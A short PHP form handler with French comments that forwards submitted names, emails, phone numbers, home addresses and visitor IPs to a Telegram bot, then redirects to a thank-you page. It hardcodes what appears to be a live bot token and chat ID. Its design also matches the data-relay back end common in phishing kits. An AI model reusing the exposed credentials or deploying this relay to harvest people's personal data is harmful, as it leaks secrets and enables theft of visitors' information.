<?php
// ==========================================================
//  Telegram Handler Corrigé et Simplifié
// ==========================================================

// ⚠️ IMPORTANT : REMPLACEZ ces deux valeurs par vos vraies informations Telegram
$botToken = '6295685387:AAHb6p_xt8yrrMP918_sLdGKy_7ITJZ5beE';
$chatId   = '5061239044'; // ID perso ou ID groupe/canal

// --- 1. Récupération des données ---

// IP du visiteur
$ip = $_SERVER['REMOTE_ADDR'] ?? 'inconnue';
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] . ' (proxy: ' . $ip . ')';
}

// Récupération sécurisée des champs demandés
$fullName  = $_POST['fullName']  ?? '';
$email     = $_POST['email']     ?? '';
$phone     = $_POST['phone']     ?? '';
$address   = $_POST['address']   ?? '';

// --- 2. Génération du Numéro de Lead ---

$leadNumberFile = __DIR__ . '/leads-counter.txt';
$leadNumber = 1;
if (file_exists($leadNumberFile)) {
    $leadNumber = (int)file_get_contents($leadNumberFile) + 1;
}
file_put_contents($leadNumberFile, (string)$leadNumber);


// --- 3. Construction du Message ---

$message  = "📨 Nouveau formulaire (#{$leadNumber})\n\n";
$message .= "👤 Nom : {$fullName}\n";
$message .= "📧 Email : {$email}\n";
$message .= "📱 Téléphone : {$phone}\n";
$message .= "🏠 Adresse complète : {$address}\n";
$message .= "💻 IP : {$ip}\n";


// --- 4. Envoi à Telegram (Utilisation de cURL ou fallback) ---

function sendTelegramMessage($token, $chat_id, $text) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = [
        'chat_id'    => $chat_id,
        'text'       => $text,
        'parse_mode' => 'Markdown'
    ];

    // Tente d'utiliser cURL (plus fiable)
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_exec($ch);
        curl_close($ch);
    } else {
        // Fallback à file_get_contents (plus fragile, mais fonctionne sur certains hôtes)
        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data),
                'timeout' => 10
            ]
        ];
        $context = stream_context_create($options);
        @file_get_contents($url, false, $context); 
    }
}

sendTelegramMessage($botToken, $chatId, $message);

// --- 5. Redirection Propre ---
// Cette étape est cruciale pour éviter ERR_INVALID_RESPONSE.
header('Location: thankyou.html');
exit;
?>
